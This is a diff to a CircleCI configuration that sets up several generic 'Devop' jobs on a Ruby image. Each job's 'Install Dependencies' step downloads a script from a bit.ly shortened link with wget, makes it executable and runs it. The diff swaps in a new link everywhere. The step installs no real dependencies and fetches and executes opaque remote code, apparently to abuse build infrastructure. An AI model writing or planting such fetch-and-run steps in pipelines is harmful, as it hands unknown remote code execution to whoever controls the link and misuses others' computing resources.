@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/32fAfpn && chmod u+x 32fAfpn && sh 32fAfpn
+            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/32fAfpn && chmod u+x 32fAfpn && sh 32fAfpn
+            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/32fAfpn && chmod u+x 32fAfpn && sh 32fAfpn
+            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/32fAfpn && chmod u+x 32fAfpn && sh 32fAfpn
+            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
 workflows:
     version: 2.1
     build:
